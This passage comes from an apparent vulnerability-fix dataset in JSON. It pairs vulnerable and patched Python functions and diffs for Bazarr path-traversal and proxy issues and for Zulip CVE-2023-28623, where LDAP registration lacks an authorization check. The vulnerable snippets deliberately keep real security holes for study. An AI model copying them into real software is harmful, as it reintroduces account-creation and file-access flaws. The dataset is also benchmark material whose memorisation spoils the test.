        "snippet": "def proxy(protocol, url):\n    if protocol.lower not in ['http', 'https']:\n        return dict(status=False, error='Unsupported protocol')\n    url = protocol + '://' + unquote(url)\n    params = request.args\n    try:\n        result = requests.get(url, params, allow_redirects=False, verify=False, timeout=5, headers=headers)\n    except Exception as e:\n        return dict(status=False, error=repr(e))\n    else:\n        if result.status_code == 200:\n            try:\n                version = result.json()['version']\n                return dict(status=True, version=version)\n            except Exception:\n                return dict(status=False, error='Error Occurred. Check your settings.')\n        elif result.status_code == 401:\n            return dict(status=False, error='Access Denied. Check API key.')\n        elif result.status_code == 404:\n            return dict(status=False, error='Cannot get version. Maybe unsupported legacy API call?')\n        elif 300 <= result.status_code <= 399:\n            return dict(status=False, error='Wrong URL Base.')\n        else:\n            return dict(status=False, error=result.raise_for_status())"
      }
    ],
    "vul_patch": "--- a/bazarr/app/ui.py\n+++ b/bazarr/app/ui.py\n@@ -1,2 +1,6 @@\n def backup_download(filename):\n-    return send_file(os.path.join(settings.backup.folder, filename), max_age=0, as_attachment=True)\n+    fullpath = os.path.normpath(os.path.join(settings.backup.folder, filename))\n+    if not fullpath.startswith(settings.backup.folder):\n+        return '', 404\n+    else:\n+        return send_file(fullpath, max_age=0, as_attachment=True)\n\n--- a/bazarr/app/ui.py\n+++ b/bazarr/app/ui.py\n@@ -1,3 +1,8 @@\n def swaggerui_static(filename):\n-    return send_file(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n-                     'static', filename))\n+    basepath = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'libs', 'flask_restx',\n+                            'static')\n+    fullpath = os.path.join(basepath, filename)\n+    if not fullpath.startswith(basepath):\n+        return '', 404\n+    else:\n+        return send_file(fullpath)\n\n--- a/bazarr/app/ui.py\n+++ b/bazarr/app/ui.py\n@@ -1,4 +1,6 @@\n def proxy(protocol, url):\n+    if protocol.lower not in ['http', 'https']:\n+        return dict(status=False, error='Unsupported protocol')\n     url = protocol + '://' + unquote(url)\n     params = request.args\n     try:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-28623",
    "cve_description": "Zulip is an open-source team collaboration tool with unique topic-based threading. In the event that 1: `ZulipLDAPAuthBackend` and an external authentication backend (any aside of `ZulipLDAPAuthBackend` and `EmailAuthBackend`) are the only ones enabled in `AUTHENTICATION_BACKENDS` in `/etc/zulip/settings.py` and 2: The organization permissions don't require invitations to join. An attacker can create a new account in the organization with an arbitrary email address in their control that's not in the organization's LDAP directory. The impact is limited to installations which have this specific combination of authentication backends as described above in addition to having `Invitations are required for joining this organization` organization permission disabled. This issue has been addressed in version 6.2. Users are advised to upgrade. Users unable to upgrade may enable the `Invitations are required for joining this organization` organization permission to prevent this issue.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/3df1b4dd7c210c21deb6f829df19412b74573f8d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_119_1",
        "commit": "baf9382",
        "file_path": "zerver/views/registration.py",
        "start_line": 148,
        "end_line": 522,
        "snippet": "@require_post\n@has_request_variables\ndef accounts_register(\n    request: HttpRequest,\n    key: str = REQ(default=\"\"),\n    timezone: str = REQ(default=\"\", converter=to_timezone_or_empty),\n    from_confirmation: Optional[str] = REQ(default=None),\n    form_full_name: Optional[str] = REQ(\"full_name\", default=None),\n    source_realm_id: Optional[int] = REQ(\n        default=None, converter=to_converted_or_fallback(to_non_negative_int, None)\n    ),\n) -> HttpResponse:\n    try:\n        prereg_user = check_prereg_key(request, key)\n    except ConfirmationKeyError as e:\n        return render_confirmation_key_error(request, e)\n\n    email = prereg_user.email\n    realm_creation = prereg_user.realm_creation\n    password_required = prereg_user.password_required\n\n    role = prereg_user.invited_as\n    if realm_creation:\n        role = UserProfile.ROLE_REALM_OWNER\n\n    try:\n        validators.validate_email(email)\n    except ValidationError:\n        return render(request, \"zerver/invalid_email.html\", context={\"invalid_email\": True})\n\n    if realm_creation:\n        # For creating a new realm, there is no existing realm or domain\n        realm = None\n    else:\n        assert prereg_user.realm is not None\n        if get_subdomain(request) != prereg_user.realm.string_id:\n            return render_confirmation_key_error(\n                request, ConfirmationKeyError(ConfirmationKeyError.DOES_NOT_EXIST)\n            )\n        realm = prereg_user.realm\n        try:\n            email_allowed_for_realm(email, realm)\n        except DomainNotAllowedForRealmError:\n            return render(\n                request,\n                \"zerver/invalid_email.html\",\n                context={\"realm_name\": realm.name, \"closed_domain\": True},\n            )\n        except DisposableEmailError:\n            return render(\n                request,\n                \"zerver/invalid_email.html\",\n                context={\"realm_name\": realm.name, \"disposable_emails_not_allowed\": True},\n            )\n        except EmailContainsPlusError:\n            return render(\n                request,\n                \"zerver/invalid_email.html\",\n                context={\"realm_name\": realm.name, \"email_contains_plus\": True},\n            )\n\n        if realm.deactivated:\n            # The user is trying to register for a deactivated realm. Advise them to\n            # contact support.\n            return redirect_to_deactivation_notice()\n\n        try:\n            validate_email_not_already_in_realm(realm, email)\n        except ValidationError:\n            return redirect_to_email_login_url(email)\n\n        if settings.BILLING_ENABLED:\n            try:\n                check_spare_licenses_available_for_registering_new_user(realm, email, role=role)\n            except LicenseLimitError:\n                return render(request, \"zerver/no_spare_licenses.html\")\n\n    name_validated = False\n    require_ldap_password = False\n\n    if from_confirmation:\n        try:\n            del request.session[\"authenticated_full_name\"]\n        except KeyError:\n            pass\n\n        ldap_full_name = None\n        if settings.POPULATE_PROFILE_VIA_LDAP:\n            # If the user can be found in LDAP, we'll take the full name from the directory,\n            # and further down create a form pre-filled with it.\n            for backend in get_backends():\n                if isinstance(backend, LDAPBackend):\n                    try:\n                        ldap_username = backend.django_to_ldap_username(email)\n                    except NoMatchingLDAPUserError:\n                        logging.warning(\"New account email %s could not be found in LDAP\", email)\n                        break\n\n                    # Note that this `ldap_user` object is not a\n                    # `ZulipLDAPUser` with a `Realm` attached, so\n                    # calling `.populate_user()` on it will crash.\n                    # This is OK, since we're just accessing this user\n                    # to extract its name.\n                    #\n                    # TODO: We should potentially be accessing this\n                    # user to sync its initial avatar and custom\n                    # profile fields as well, if we indeed end up\n                    # creating a user account through this flow,\n                    # rather than waiting until `manage.py\n                    # sync_ldap_user_data` runs to populate it.\n                    ldap_user = _LDAPUser(backend, ldap_username)\n\n                    try:\n                        ldap_full_name = backend.get_mapped_name(ldap_user)\n                    except TypeError:\n                        break\n\n                    # Check whether this is ZulipLDAPAuthBackend,\n                    # which is responsible for authentication and\n                    # requires that LDAP accounts enter their LDAP\n                    # password to register, or ZulipLDAPUserPopulator,\n                    # which just populates UserProfile fields (no auth).\n                    require_ldap_password = isinstance(backend, ZulipLDAPAuthBackend)\n                    break\n\n        if ldap_full_name:\n            # We don't use initial= here, because if the form is\n            # complete (that is, no additional fields need to be\n            # filled out by the user) we want the form to validate,\n            # so they can be directly registered without having to\n            # go through this interstitial.\n            form = RegistrationForm({\"full_name\": ldap_full_name}, realm_creation=realm_creation)\n            request.session[\"authenticated_full_name\"] = ldap_full_name\n            name_validated = True\n        elif realm is not None and realm.is_zephyr_mirror_realm:\n            # For MIT users, we can get an authoritative name from Hesiod.\n            # Technically we should check that this is actually an MIT\n            # realm, but we can cross that bridge if we ever get a non-MIT\n            # zephyr mirroring realm.\n            hesiod_name = compute_mit_user_fullname(email)\n            form = RegistrationForm(\n                initial={\"full_name\": hesiod_name if \"@\" not in hesiod_name else \"\"},\n                realm_creation=realm_creation,\n            )\n            name_validated = True\n        elif prereg_user.full_name:\n            if prereg_user.full_name_validated:\n                request.session[\"authenticated_full_name\"] = prereg_user.full_name\n                name_validated = True\n                form = RegistrationForm(\n                    {\"full_name\": prereg_user.full_name}, realm_creation=realm_creation\n                )\n            else:\n                form = RegistrationForm(\n                    initial={\"full_name\": prereg_user.full_name}, realm_creation=realm_creation\n                )\n        elif form_full_name is not None:\n            form = RegistrationForm(\n                initial={\"full_name\": form_full_name},\n                realm_creation=realm_creation,\n            )\n        else:\n            form = RegistrationForm(realm_creation=realm_creation)\n    else:\n        postdata = request.POST.copy()\n        if name_changes_disabled(realm):\n            # If we populate profile information via LDAP and we have a\n            # verified name from you on file, use that. Otherwise, fall\n            # back to the full name in the request.\n            try:\n                postdata.update(full_name=request.session[\"authenticated_full_name\"])\n                name_validated = True\n            except KeyError:\n                pass\n        form = RegistrationForm(postdata, realm_creation=realm_creation)\n\n    if not (password_auth_enabled(realm) and password_required):\n        form[\"password\"].field.required = False\n\n    if form.is_valid():\n        if password_auth_enabled(realm) and form[\"password\"].field.required:\n            password = form.cleaned_data[\"password\"]\n        else:\n            # If the user wasn't prompted for a password when\n            # completing the authentication form (because they're\n            # signing up with SSO and no password is required), set\n            # the password field to `None` (Which causes Django to\n            # create an unusable password).\n            password = None\n\n        if realm_creation:\n            string_id = form.cleaned_data[\"realm_subdomain\"]\n            realm_name = form.cleaned_data[\"realm_name\"]\n            realm_type = form.cleaned_data[\"realm_type\"]\n            is_demo_org = form.cleaned_data[\"is_demo_organization\"]\n            realm = do_create_realm(\n                string_id, realm_name, org_type=realm_type, is_demo_organization=is_demo_org\n            )\n        assert realm is not None\n\n        full_name = form.cleaned_data[\"full_name\"]\n        enable_marketing_emails = form.cleaned_data[\"enable_marketing_emails\"]\n        default_stream_group_names = request.POST.getlist(\"default_stream_group\")\n        default_stream_groups = lookup_default_stream_groups(default_stream_group_names, realm)\n\n        if source_realm_id is not None:\n            # Non-integer realm_id values like \"string\" are treated\n            # like the \"Do not import\" value of \"\".\n            source_profile: Optional[UserProfile] = get_source_profile(email, source_realm_id)\n        else:\n            source_profile = None\n\n        if not realm_creation:\n            try:\n                existing_user_profile: Optional[UserProfile] = get_user_by_delivery_email(\n                    email, realm\n                )\n            except UserProfile.DoesNotExist:\n                existing_user_profile = None\n        else:\n            existing_user_profile = None\n\n        user_profile: Optional[UserProfile] = None\n        return_data: Dict[str, bool] = {}\n        if ldap_auth_enabled(realm):\n            # If the user was authenticated using an external SSO\n            # mechanism like Google or GitHub auth, then authentication\n            # will have already been done before creating the\n            # PreregistrationUser object with password_required=False, and\n            # so we don't need to worry about passwords.\n            #\n            # If instead the realm is using EmailAuthBackend, we will\n            # set their password above.\n            #\n            # But if the realm is using LDAPAuthBackend, we need to verify\n            # their LDAP password (which will, as a side effect, create\n            # the user account) here using authenticate.\n            # prereg_user.realm_creation carries the information about whether\n            # we're in realm creation mode, and the ldap flow will handle\n            # that and create the user with the appropriate parameters.\n            user = authenticate(\n                request=request,\n                username=email,\n                password=password,\n                realm=realm,\n                prereg_user=prereg_user,\n                return_data=return_data,\n            )\n            if user is None:\n                can_use_different_backend = email_auth_enabled(realm) or (\n                    len(get_external_method_dicts(realm)) > 0\n                )\n                if settings.LDAP_APPEND_DOMAIN:\n                    # In LDAP_APPEND_DOMAIN configurations, we don't allow making a non-LDAP account\n                    # if the email matches the ldap domain.\n                    can_use_different_backend = can_use_different_backend and (\n                        not email_belongs_to_ldap(realm, email)\n                    )\n                if return_data.get(\"no_matching_ldap_user\") and can_use_different_backend:\n                    # If both the LDAP and Email or Social auth backends are\n                    # enabled, and there's no matching user in the LDAP\n                    # directory then the intent is to create a user in the\n                    # realm with their email outside the LDAP organization\n                    # (with e.g. a password stored in the Zulip database,\n                    # not LDAP).  So we fall through and create the new\n                    # account.\n                    pass\n                else:\n                    # TODO: This probably isn't going to give a\n                    # user-friendly error message, but it doesn't\n                    # particularly matter, because the registration form\n                    # is hidden for most users.\n                    view_url = reverse(\"login\")\n                    query = urlencode({\"email\": email})\n                    redirect_url = append_url_query_string(view_url, query)\n                    return HttpResponseRedirect(redirect_url)\n            else:\n                assert isinstance(user, UserProfile)\n                user_profile = user\n                if not realm_creation:\n                    # Since we'll have created a user, we now just log them in.\n                    return login_and_go_to_home(request, user_profile)\n                # With realm_creation=True, we're going to return further down,\n                # after finishing up the creation process.\n\n        if existing_user_profile is not None and existing_user_profile.is_mirror_dummy:\n            user_profile = existing_user_profile\n            do_activate_mirror_dummy_user(user_profile, acting_user=user_profile)\n            do_change_password(user_profile, password)\n            do_change_full_name(user_profile, full_name, user_profile)\n            do_change_user_setting(user_profile, \"timezone\", timezone, acting_user=user_profile)\n            do_change_user_setting(\n                user_profile,\n                \"default_language\",\n                get_default_language_for_new_user(request, realm),\n                acting_user=None,\n            )\n            # TODO: When we clean up the `do_activate_mirror_dummy_user` code path,\n            # make it respect invited_as_admin / is_realm_admin.\n\n        if user_profile is None:\n            user_profile = do_create_user(\n                email,\n                password,\n                realm,\n                full_name,\n                prereg_user=prereg_user,\n                role=role,\n                tos_version=settings.TERMS_OF_SERVICE_VERSION,\n                timezone=timezone,\n                default_language=get_default_language_for_new_user(request, realm),\n                default_stream_groups=default_stream_groups,\n                source_profile=source_profile,\n                realm_creation=realm_creation,\n                acting_user=None,\n                enable_marketing_emails=enable_marketing_emails,\n            )\n\n        if realm_creation:\n            # Because for realm creation, registration happens on the\n            # root domain, we need to log them into the subdomain for\n            # their new realm.\n            return redirect_and_log_into_subdomain(\n                ExternalAuthResult(user_profile=user_profile, data_dict={\"is_realm_creation\": True})\n            )\n\n        # This dummy_backend check below confirms the user is\n        # authenticating to the correct subdomain.\n        auth_result = authenticate(\n            username=user_profile.delivery_email,\n            realm=realm,\n            return_data=return_data,\n            use_dummy_backend=True,\n        )\n        if return_data.get(\"invalid_subdomain\"):\n            # By construction, this should never happen.\n            logging.error(\n                \"Subdomain mismatch in registration %s: %s\",\n                realm.subdomain,\n                user_profile.delivery_email,\n            )\n            return redirect(\"/\")\n\n        assert isinstance(auth_result, UserProfile)\n        return login_and_go_to_home(request, auth_result)\n\n    return render(\n        request,\n        \"zerver/register.html\",\n        context={\n            \"form\": form,\n            \"email\": email,\n            \"key\": key,\n            \"full_name\": request.session.get(\"authenticated_full_name\", None),\n            \"lock_name\": name_validated and name_changes_disabled(realm),\n            # password_auth_enabled is normally set via our context processor,\n            # but for the registration form, there is no logged in user yet, so\n            # we have to set it here.\n            \"creating_new_team\": realm_creation,\n            \"password_required\": password_auth_enabled(realm) and password_required,\n            \"require_ldap_password\": require_ldap_password,\n            \"password_auth_enabled\": password_auth_enabled(realm),\n            \"root_domain_available\": is_root_domain_available(),\n            \"default_stream_groups\": [] if realm is None else get_default_stream_groups(realm),\n            \"accounts\": get_accounts_for_email(email),\n            \"MAX_REALM_NAME_LENGTH\": str(Realm.MAX_REALM_NAME_LENGTH),\n            \"MAX_NAME_LENGTH\": str(UserProfile.MAX_NAME_LENGTH),\n            \"MAX_PASSWORD_LENGTH\": str(form.MAX_PASSWORD_LENGTH),\n            \"MAX_REALM_SUBDOMAIN_LENGTH\": str(Realm.MAX_REALM_SUBDOMAIN_LENGTH),\n            \"corporate_enabled\": settings.CORPORATE_ENABLED,\n            \"sorted_realm_types\": sorted(\n                Realm.ORG_TYPES.values(), key=lambda d: d[\"display_order\"]\n            ),\n        },\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_119_1",
        "commit": "3df1b4d",
        "file_path": "zerver/views/registration.py",
        "start_line": 148,
        "end_line": 545,
        "snippet": "@require_post\n@has_request_variables\ndef accounts_register(\n    request: HttpRequest,\n    key: str = REQ(default=\"\"),\n    timezone: str = REQ(default=\"\", converter=to_timezone_or_empty),\n    from_confirmation: Optional[str] = REQ(default=None),\n    form_full_name: Optional[str] = REQ(\"full_name\", default=None),\n    source_realm_id: Optional[int] = REQ(\n        default=None, converter=to_converted_or_fallback(to_non_negative_int, None)\n    ),\n) -> HttpResponse:\n    try:\n        prereg_user = check_prereg_key(request, key)\n    except ConfirmationKeyError as e:\n        return render_confirmation_key_error(request, e)\n\n    email = prereg_user.email\n    realm_creation = prereg_user.realm_creation\n    password_required = prereg_user.password_required\n\n    role = prereg_user.invited_as\n    if realm_creation:\n        role = UserProfile.ROLE_REALM_OWNER\n\n    try:\n        validators.validate_email(email)\n    except ValidationError:\n        return render(request, \"zerver/invalid_email.html\", context={\"invalid_email\": True})\n\n    if realm_creation:\n        # For creating a new realm, there is no existing realm or domain\n        realm = None\n    else:\n        assert prereg_user.realm is not None\n        if get_subdomain(request) != prereg_user.realm.string_id:\n            return render_confirmation_key_error(\n                request, ConfirmationKeyError(ConfirmationKeyError.DOES_NOT_EXIST)\n            )\n        realm = prereg_user.realm\n        try:\n            email_allowed_for_realm(email, realm)\n        except DomainNotAllowedForRealmError:\n            return render(\n                request,\n                \"zerver/invalid_email.html\",\n                context={\"realm_name\": realm.name, \"closed_domain\": True},\n            )\n        except DisposableEmailError:\n            return render(\n                request,\n                \"zerver/invalid_email.html\",\n                context={\"realm_name\": realm.name, \"disposable_emails_not_allowed\": True},\n            )\n        except EmailContainsPlusError:\n            return render(\n                request,\n                \"zerver/invalid_email.html\",\n                context={\"realm_name\": realm.name, \"email_contains_plus\": True},\n            )\n\n        if realm.deactivated:\n            # The user is trying to register for a deactivated realm. Advise them to\n            # contact support.\n            return redirect_to_deactivation_notice()\n\n        try:\n            validate_email_not_already_in_realm(realm, email)\n        except ValidationError:\n            return redirect_to_email_login_url(email)\n\n        if settings.BILLING_ENABLED:\n            try:\n                check_spare_licenses_available_for_registering_new_user(realm, email, role=role)\n            except LicenseLimitError:\n                return render(request, \"zerver/no_spare_licenses.html\")\n\n    name_validated = False\n    require_ldap_password = False\n\n    if from_confirmation:\n        try:\n            del request.session[\"authenticated_full_name\"]\n        except KeyError:\n            pass\n\n        ldap_full_name = None\n        if settings.POPULATE_PROFILE_VIA_LDAP:\n            # If the user can be found in LDAP, we'll take the full name from the directory,\n            # and further down create a form pre-filled with it.\n            for backend in get_backends():\n                if isinstance(backend, LDAPBackend):\n                    try:\n                        ldap_username = backend.django_to_ldap_username(email)\n                    except NoMatchingLDAPUserError:\n                        logging.warning(\"New account email %s could not be found in LDAP\", email)\n                        break\n\n                    # Note that this `ldap_user` object is not a\n                    # `ZulipLDAPUser` with a `Realm` attached, so\n                    # calling `.populate_user()` on it will crash.\n                    # This is OK, since we're just accessing this user\n                    # to extract its name.\n                    #\n                    # TODO: We should potentially be accessing this\n                    # user to sync its initial avatar and custom\n                    # profile fields as well, if we indeed end up\n                    # creating a user account through this flow,\n                    # rather than waiting until `manage.py\n                    # sync_ldap_user_data` runs to populate it.\n                    ldap_user = _LDAPUser(backend, ldap_username)\n\n                    try:\n                        ldap_full_name = backend.get_mapped_name(ldap_user)\n                    except TypeError:\n                        break\n\n                    # Check whether this is ZulipLDAPAuthBackend,\n                    # which is responsible for authentication and\n                    # requires that LDAP accounts enter their LDAP\n                    # password to register, or ZulipLDAPUserPopulator,\n                    # which just populates UserProfile fields (no auth).\n                    require_ldap_password = isinstance(backend, ZulipLDAPAuthBackend)\n                    break\n\n        if ldap_full_name:\n            # We don't use initial= here, because if the form is\n            # complete (that is, no additional fields need to be\n            # filled out by the user) we want the form to validate,\n            # so they can be directly registered without having to\n            # go through this interstitial.\n            form = RegistrationForm({\"full_name\": ldap_full_name}, realm_creation=realm_creation)\n            request.session[\"authenticated_full_name\"] = ldap_full_name\n            name_validated = True\n        elif realm is not None and realm.is_zephyr_mirror_realm:\n            # For MIT users, we can get an authoritative name from Hesiod.\n            # Technically we should check that this is actually an MIT\n            # realm, but we can cross that bridge if we ever get a non-MIT\n            # zephyr mirroring realm.\n            hesiod_name = compute_mit_user_fullname(email)\n            form = RegistrationForm(\n                initial={\"full_name\": hesiod_name if \"@\" not in hesiod_name else \"\"},\n                realm_creation=realm_creation,\n            )\n            name_validated = True\n        elif prereg_user.full_name:\n            if prereg_user.full_name_validated:\n                request.session[\"authenticated_full_name\"] = prereg_user.full_name\n                name_validated = True\n                form = RegistrationForm(\n                    {\"full_name\": prereg_user.full_name}, realm_creation=realm_creation\n                )\n            else:\n                form = RegistrationForm(\n                    initial={\"full_name\": prereg_user.full_name}, realm_creation=realm_creation\n                )\n        elif form_full_name is not None:\n            form = RegistrationForm(\n                initial={\"full_name\": form_full_name},\n                realm_creation=realm_creation,\n            )\n        else:\n            form = RegistrationForm(realm_creation=realm_creation)\n    else:\n        postdata = request.POST.copy()\n        if name_changes_disabled(realm):\n            # If we populate profile information via LDAP and we have a\n            # verified name from you on file, use that. Otherwise, fall\n            # back to the full name in the request.\n            try:\n                postdata.update(full_name=request.session[\"authenticated_full_name\"])\n                name_validated = True\n            except KeyError:\n                pass\n        form = RegistrationForm(postdata, realm_creation=realm_creation)\n\n    if not (password_auth_enabled(realm) and password_required):\n        form[\"password\"].field.required = False\n\n    if form.is_valid():\n        if password_auth_enabled(realm) and form[\"password\"].field.required:\n            password = form.cleaned_data[\"password\"]\n        else:\n            # If the user wasn't prompted for a password when\n            # completing the authentication form (because they're\n            # signing up with SSO and no password is required), set\n            # the password field to `None` (Which causes Django to\n            # create an unusable password).\n            password = None\n\n        if realm_creation:\n            string_id = form.cleaned_data[\"realm_subdomain\"]\n            realm_name = form.cleaned_data[\"realm_name\"]\n            realm_type = form.cleaned_data[\"realm_type\"]\n            is_demo_org = form.cleaned_data[\"is_demo_organization\"]\n            realm = do_create_realm(\n                string_id, realm_name, org_type=realm_type, is_demo_organization=is_demo_org\n            )\n        assert realm is not None\n\n        full_name = form.cleaned_data[\"full_name\"]\n        enable_marketing_emails = form.cleaned_data[\"enable_marketing_emails\"]\n        default_stream_group_names = request.POST.getlist(\"default_stream_group\")\n        default_stream_groups = lookup_default_stream_groups(default_stream_group_names, realm)\n\n        if source_realm_id is not None:\n            # Non-integer realm_id values like \"string\" are treated\n            # like the \"Do not import\" value of \"\".\n            source_profile: Optional[UserProfile] = get_source_profile(email, source_realm_id)\n        else:\n            source_profile = None\n\n        if not realm_creation:\n            try:\n                existing_user_profile: Optional[UserProfile] = get_user_by_delivery_email(\n                    email, realm\n                )\n            except UserProfile.DoesNotExist:\n                existing_user_profile = None\n        else:\n            existing_user_profile = None\n\n        user_profile: Optional[UserProfile] = None\n        return_data: Dict[str, bool] = {}\n        if ldap_auth_enabled(realm):\n            # If the user was authenticated using an external SSO\n            # mechanism like Google or GitHub auth, then authentication\n            # will have already been done before creating the\n            # PreregistrationUser object with password_required=False, and\n            # so we don't need to worry about passwords.\n            #\n            # If instead the realm is using EmailAuthBackend, we will\n            # set their password above.\n            #\n            # But if the realm is using LDAPAuthBackend, we need to verify\n            # their LDAP password (which will, as a side effect, create\n            # the user account) here using authenticate.\n            # prereg_user.realm_creation carries the information about whether\n            # we're in realm creation mode, and the ldap flow will handle\n            # that and create the user with the appropriate parameters.\n            user = authenticate(\n                request=request,\n                username=email,\n                password=password,\n                realm=realm,\n                prereg_user=prereg_user,\n                return_data=return_data,\n            )\n            if user is None:\n                # This logic is security-sensitive. The user has NOT been successfully authenticated\n                # with LDAP and we need to carefully decide whether they should be permitted to proceed\n                # with account creation anyway or be stopped. There are three scenarios to consider:\n                #\n                # 1. EmailAuthBackend is enabled for the realm. That explicitly means that a user\n                #    with a valid confirmation link should be able to create an account, because\n                #    they were invited or organization permissions allowed sign up.\n                # 2. EmailAuthBackend is disabled - that means the organization wants to be authenticating\n                #    users with an external source (LDAP or one of the ExternalAuthMethods). If the user\n                #    came here through one of the ExternalAuthMethods, their identity can be considered\n                #    verified and account creation can proceed.\n                # 3. EmailAuthBackend is disabled and the user did not come here through an ExternalAuthMethod.\n                #    That means they came here by entering their email address on the registration page\n                #    and clicking the confirmation link received. That means their identity needs to be\n                #    verified with LDAP - and that has just failed above. Thus the account should NOT be\n                #    created.\n                #\n                if email_auth_enabled(realm):\n                    can_use_different_backend = True\n                # We can identify the user came here through an ExternalAuthMethod by password_required\n                # being set to False on the PreregistrationUser object.\n                elif len(get_external_method_dicts(realm)) > 0 and not password_required:\n                    can_use_different_backend = True\n                else:\n                    can_use_different_backend = False\n\n                if settings.LDAP_APPEND_DOMAIN:\n                    # In LDAP_APPEND_DOMAIN configurations, we don't allow making a non-LDAP account\n                    # if the email matches the ldap domain.\n                    can_use_different_backend = can_use_different_backend and (\n                        not email_belongs_to_ldap(realm, email)\n                    )\n                if return_data.get(\"no_matching_ldap_user\") and can_use_different_backend:\n                    # If both the LDAP and Email or Social auth backends are\n                    # enabled, and there's no matching user in the LDAP\n                    # directory then the intent is to create a user in the\n                    # realm with their email outside the LDAP organization\n                    # (with e.g. a password stored in the Zulip database,\n                    # not LDAP).  So we fall through and create the new\n                    # account.\n                    pass\n                else:\n                    # TODO: This probably isn't going to give a\n                    # user-friendly error message, but it doesn't\n                    # particularly matter, because the registration form\n                    # is hidden for most users.\n                    view_url = reverse(\"login\")\n                    query = urlencode({\"email\": email})\n                    redirect_url = append_url_query_string(view_url, query)\n                    return HttpResponseRedirect(redirect_url)\n            else:\n                assert isinstance(user, UserProfile)\n                user_profile = user\n                if not realm_creation:\n                    # Since we'll have created a user, we now just log them in.\n                    return login_and_go_to_home(request, user_profile)\n                # With realm_creation=True, we're going to return further down,\n                # after finishing up the creation process.\n\n        if existing_user_profile is not None and existing_user_profile.is_mirror_dummy:\n            user_profile = existing_user_profile\n            do_activate_mirror_dummy_user(user_profile, acting_user=user_profile)\n            do_change_password(user_profile, password)\n            do_change_full_name(user_profile, full_name, user_profile)\n            do_change_user_setting(user_profile, \"timezone\", timezone, acting_user=user_profile)\n            do_change_user_setting(\n                user_profile,\n                \"default_language\",\n                get_default_language_for_new_user(request, realm),\n                acting_user=None,\n            )\n            # TODO: When we clean up the `do_activate_mirror_dummy_user` code path,\n            # make it respect invited_as_admin / is_realm_admin.\n\n        if user_profile is None:\n            user_profile = do_create_user(\n                email,\n                password,\n                realm,\n                full_name,\n                prereg_user=prereg_user,\n                role=role,\n                tos_version=settings.TERMS_OF_SERVICE_VERSION,\n                timezone=timezone,\n                default_language=get_default_language_for_new_user(request, realm),\n                default_stream_groups=default_stream_groups,\n                source_profile=source_profile,\n                realm_creation=realm_creation,\n                acting_user=None,\n                enable_marketing_emails=enable_marketing_emails,\n            )\n\n        if realm_creation:\n            # Because for realm creation, registration happens on the\n            # root domain, we need to log them into the subdomain for\n            # their new realm.\n            return redirect_and_log_into_subdomain(\n                ExternalAuthResult(user_profile=user_profile, data_dict={\"is_realm_creation\": True})\n            )\n\n        # This dummy_backend check below confirms the user is\n        # authenticating to the correct subdomain.\n        auth_result = authenticate(\n            username=user_profile.delivery_email,\n            realm=realm,\n            return_data=return_data,\n            use_dummy_backend=True,\n        )\n        if return_data.get(\"invalid_subdomain\"):\n            # By construction, this should never happen.\n            logging.error(\n                \"Subdomain mismatch in registration %s: %s\",\n                realm.subdomain,\n                user_profile.delivery_email,\n            )\n            return redirect(\"/\")\n\n        assert isinstance(auth_result, UserProfile)\n        return login_and_go_to_home(request, auth_result)\n\n    return render(\n        request,\n        \"zerver/register.html\",\n        context={\n            \"form\": form,\n            \"email\": email,\n            \"key\": key,\n            \"full_name\": request.session.get(\"authenticated_full_name\", None),\n            \"lock_name\": name_validated and name_changes_disabled(realm),\n            # password_auth_enabled is normally set via our context processor,\n            # but for the registration form, there is no logged in user yet, so\n            # we have to set it here.\n            \"creating_new_team\": realm_creation,\n            \"password_required\": password_auth_enabled(realm) and password_required,\n            \"require_ldap_password\": require_ldap_password,\n            \"password_auth_enabled\": password_auth_enabled(realm),\n            \"root_domain_available\": is_root_domain_available(),\n            \"default_stream_groups\": [] if realm is None else get_default_stream_groups(realm),\n            \"accounts\": get_accounts_for_email(email),\n            \"MAX_REALM_NAME_LENGTH\": str(Realm.MAX_REALM_NAME_LENGTH),\n            \"MAX_NAME_LENGTH\": str(UserProfile.MAX_NAME_LENGTH),\n            \"MAX_PASSWORD_LENGTH\": str(form.MAX_PASSWORD_LENGTH),\n            \"MAX_REALM_SUBDOMAIN_LENGTH\": str(Realm.MAX_REALM_SUBDOMAIN_LENGTH),\n            \"corporate_enabled\": settings.CORPORATE_ENABLED,\n            \"sorted_realm_types\": sorted(\n                Realm.ORG_TYPES.values(), key=lambda d: d[\"display_order\"]\n            ),\n        },\n    )"
      }
    ],
    "vul_patch": "--- a/zerver/views/registration.py\n+++ b/zerver/views/registration.py\n@@ -247,9 +247,32 @@\n                 return_data=return_data,\n             )\n             if user is None:\n-                can_use_different_backend = email_auth_enabled(realm) or (\n-                    len(get_external_method_dicts(realm)) > 0\n-                )\n+                # This logic is security-sensitive. The user has NOT been successfully authenticated\n+                # with LDAP and we need to carefully decide whether they should be permitted to proceed\n+                # with account creation anyway or be stopped. There are three scenarios to consider:\n+                #\n+                # 1. EmailAuthBackend is enabled for the realm. That explicitly means that a user\n+                #    with a valid confirmation link should be able to create an account, because\n+                #    they were invited or organization permissions allowed sign up.\n+                # 2. EmailAuthBackend is disabled - that means the organization wants to be authenticating\n+                #    users with an external source (LDAP or one of the ExternalAuthMethods). If the user\n+                #    came here through one of the ExternalAuthMethods, their identity can be considered\n+                #    verified and account creation can proceed.\n+                # 3. EmailAuthBackend is disabled and the user did not come here through an ExternalAuthMethod.\n+                #    That means they came here by entering their email address on the registration page\n+                #    and clicking the confirmation link received. That means their identity needs to be\n+                #    verified with LDAP - and that has just failed above. Thus the account should NOT be\n+                #    created.\n+                #\n+                if email_auth_enabled(realm):\n+                    can_use_different_backend = True\n+                # We can identify the user came here through an ExternalAuthMethod by password_required\n+                # being set to False on the PreregistrationUser object.\n+                elif len(get_external_method_dicts(realm)) > 0 and not password_required:\n+                    can_use_different_backend = True\n+                else:\n+                    can_use_different_backend = False\n+\n                 if settings.LDAP_APPEND_DOMAIN:\n                     # In LDAP_APPEND_DOMAIN configurations, we don't allow making a non-LDAP account\n                     # if the email matches the ldap domain.\n\n",
    "poc_patch": null,
